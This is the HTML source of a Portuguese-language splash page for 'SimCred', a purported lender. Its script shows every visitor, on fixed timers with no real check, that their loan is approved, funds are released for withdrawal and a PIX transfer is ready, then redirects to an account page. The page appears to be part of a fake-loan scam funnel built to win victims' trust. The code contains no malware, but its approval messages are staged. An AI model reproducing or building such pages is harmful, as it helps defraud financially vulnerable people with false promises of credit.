<!DOCTYPE html><html lang="pt-BR"><head><script src="/jquery-4.0.0.min.js"></script>

  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
  <title>SimCred — Configurando sua conta</title>
  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&family=Outfit:wght@400;500;600;700;800&family=Sora:wght@600;700;800&display=swap" rel="stylesheet">
  <style>
    :root {
      --green: #22C55E;
      --green-dark: #1a9e4c;
      --navy: #042444;
      --navy-dark: #021830;
      --navy-light: #0a3a6e;
    }
    *{box-sizing:border-box;margin:0;padding:0;}
    html,body{height:100%;width:100%;overflow:hidden;}
    body{
      font-family:'DM Sans',sans-serif;
      background:linear-gradient(160deg,var(--navy-dark) 0%,var(--navy) 40%,var(--navy-light) 80%,#0f4d8a 100%);
      display:flex;align-items:center;justify-content:center;flex-direction:column;
      position:fixed;inset:0;-webkit-font-smoothing:antialiased;
    }

    /* Decorative blobs */
    body::before{content:'';position:absolute;top:-100px;right:-60px;width:300px;height:300px;background:radial-gradient(circle,rgba(34,197,94,.12) 0%,transparent 70%);pointer-events:none;}
    body::after{content:'';position:absolute;bottom:-80px;left:-50px;width:250px;height:250px;background:radial-gradient(circle,rgba(34,197,94,.07) 0%,transparent 70%);pointer-events:none;}

    /* ===== HEADER ===== */
    .top-bar{
      position:fixed;top:0;left:0;right:0;
      background:rgba(2,24,48,.85);backdrop-filter:blur(10px);
      border-bottom:1px solid rgba(255,255,255,.07);
      padding:12px 20px;display:flex;align-items:center;justify-content:center;
      z-index:10;
    }
    .logo-wrap{display:flex;align-items:center;}
    .logo-img{height:38px;width:auto;object-fit:contain;display:block;}

    .container{
      display:flex;flex-direction:column;align-items:center;text-align:center;
      padding:80px 30px 80px;max-width:400px;width:100%;position:relative;z-index:1;
    }

    /* ===== GREETING ===== */
    .greeting{margin-bottom:32px;animation:fadeUp .6s .2s ease both;}
    .greeting span{font-size:15px;color:rgba(255,255,255,.55);font-weight:500;}
    .greeting h1{font-family:'Outfit',sans-serif;font-size:26px;font-weight:800;color:white;margin-top:4px;letter-spacing:-.3px;}

    /* ===== SPINNER ===== */
    .spinner-wrap{position:relative;width:72px;height:72px;margin:0 auto 20px;animation:fadeUp .6s .4s ease both;}
    .spinner-ring{
      width:72px;height:72px;border:3px solid rgba(255,255,255,.08);
      border-top:3px solid var(--green);border-radius:50%;
      animation:spin .9s linear infinite;
    }
    .spinner-inner{
      position:absolute;inset:10px;border:2px solid rgba(34,197,94,.2);
      border-top:2px solid rgba(34,197,94,.6);border-radius:50%;
      animation:spin .6s linear infinite reverse;
    }
    @keyframes spin{to{transform:rotate(360deg);}}

    .status-text{
      font-family:'Outfit',sans-serif;font-size:16px;font-weight:600;
      color:rgba(255,255,255,.7);margin-bottom:32px;
      animation:fadeUp .6s .5s ease both;
      min-height:24px;
    }

    /* ===== CHECKLIST ===== */
    .checklist{display:flex;flex-direction:column;gap:12px;width:100%;max-width:340px;margin-bottom:32px;}
    .check-item{
      display:flex;align-items:center;gap:14px;
      background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.07);
      border-radius:14px;padding:14px 16px;
      opacity:0;transform:translateX(-16px);
      transition:all .5s cubic-bezier(.4,0,.2,1);
    }
    .check-item.show{
      opacity:1;transform:translateX(0);
      background:rgba(34,197,94,.08);border-color:rgba(34,197,94,.25);
    }
    .check-icon{
      width:32px;height:32px;border-radius:50%;flex-shrink:0;
      display:flex;align-items:center;justify-content:center;
      background:rgba(255,255,255,.08);border:2px solid rgba(255,255,255,.12);
      transition:all .4s ease;
    }
    .check-item.show .check-icon{
      background:var(--green);border-color:var(--green);
      box-shadow:0 0 12px rgba(34,197,94,.4);
    }
    .check-icon svg{width:15px;height:15px;color:white;stroke-width:3;opacity:0;transform:scale(.5);transition:all .3s .15s ease;}
    .check-item.show .check-icon svg{opacity:1;transform:scale(1);}
    .check-text{font-size:14px;font-weight:600;color:rgba(255,255,255,.5);text-align:left;transition:color .4s;}
    .check-item.show .check-text{color:rgba(255,255,255,.9);}

    /* ===== PROGRESS BAR ===== */
    .progress-wrap{width:100%;max-width:340px;animation:fadeUp .6s .7s ease both;}
    .progress-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;}
    .progress-label{font-size:12px;color:rgba(255,255,255,.4);}
    .progress-pct{font-size:12px;font-weight:700;color:var(--green);}
    .progress-bar{width:100%;height:5px;background:rgba(255,255,255,.08);border-radius:10px;overflow:hidden;}
    .progress-fill{
      height:100%;width:0%;
      background:linear-gradient(90deg,var(--green-dark),var(--green));
      border-radius:10px;transition:width .7s ease;
      box-shadow:0 0 8px rgba(34,197,94,.5);
    }

    /* ===== FOOTER ===== */
    .splash-foot{
      position:fixed;bottom:0;left:0;right:0;
      padding:14px 20px env(safe-area-inset-bottom,14px);text-align:center;
      background:rgba(2,24,48,.5);border-top:1px solid rgba(255,255,255,.05);
    }
    .splash-foot p{font-size:10px;color:rgba(255,255,255,.25);line-height:1.5;}

    /* ===== ANIMATIONS ===== */
    @keyframes fadeUp{from{opacity:0;transform:translateY(16px);}to{opacity:1;transform:translateY(0);}}
  </style>
</head>
<body>

  <!-- HEADER -->
  <div class="top-bar">
    <div class="logo-wrap">
      <img class="logo-img" src="images/sim-cred.png" alt="SimCred">
    </div>
  </div>

  <div class="container">
    <!-- GREETING -->
    <div class="greeting">
      <span>Olá,</span>
      <h1 id="userName">Cliente</h1>
    </div>

    <!-- SPINNER -->
    <div class="spinner-wrap">
      <div class="spinner-ring"></div>
      <div class="spinner-inner"></div>
    </div>
    <div class="status-text" id="statusText">Configurando sua conta...</div>

    <!-- CHECKLIST -->
    <div class="checklist">
      <div class="check-item" id="step1">
        <div class="check-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path></svg></div>
        <span class="check-text">Conta criada com sucesso</span>
      </div>
      <div class="check-item" id="step2">
        <div class="check-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path></svg></div>
        <span class="check-text">Empréstimo aprovado e disponível</span>
      </div>
      <div class="check-item" id="step3">
        <div class="check-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path></svg></div>
        <span class="check-text">Saldo liberado para saque</span>
      </div>
      <div class="check-item" id="step4">
        <div class="check-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path></svg></div>
        <span class="check-text">PIX pronto para transferência</span>
      </div>
    </div>

    <!-- PROGRESS BAR -->
    <div class="progress-wrap">
      <div class="progress-header">
        <span class="progress-label" id="progLabel">Preparando tudo para você...</span>
        <span class="progress-pct" id="progPct">0%</span>
      </div>
      <div class="progress-bar"><div class="progress-fill" id="progFill"></div></div>
    </div>
  </div>

  <!-- FOOTER -->
  <div class="splash-foot">
    <p>SimCred Financeira S.A. — CNPJ 36.947.229/0001-85<br>Ambiente seguro com criptografia SSL</p>
  </div>

<script>
  const nome = localStorage.getItem('nome') || '';
  if (nome) {
    const primeiro = nome.trim().split(' ')[0];
    document.getElementById('userName').textContent = primeiro;
  }

  const steps = ['step1','step2','step3','step4'];
  const fill = document.getElementById('progFill');
  const pct = document.getElementById('progPct');
  const label = document.getElementById('progLabel');
  const statusText = document.getElementById('statusText');

  const messages = [
    'Configurando sua conta...',
    'Verificando seus dados...',
    'Ativando empréstimo...',
    'Preparando ambiente...',
    'Quase pronto...'
  ];

  let current = 0;
  function nextStep() {
    if (current < steps.length) {
      document.getElementById(steps[current]).classList.add('show');
      const perc = Math.round((current + 1) / steps.length * 100);
      fill.style.width = perc + '%';
      pct.textContent = perc + '%';
      statusText.textContent = messages[current + 1] || messages[current];
      current++;
      setTimeout(nextStep, 1800);
    } else {
      label.textContent = 'Pronto! Redirecionando...';
      pct.textContent = '100%';
      statusText.textContent = 'Tudo pronto!';
      setTimeout(() => {
        const p = new URLSearchParams(window.location.search);
        window.location.href = '/conta' + (p.toString() ? '?' + p : '');
      }, 1200);
    }
  }

  setTimeout(nextStep, 1800);
</script>

</body></html>
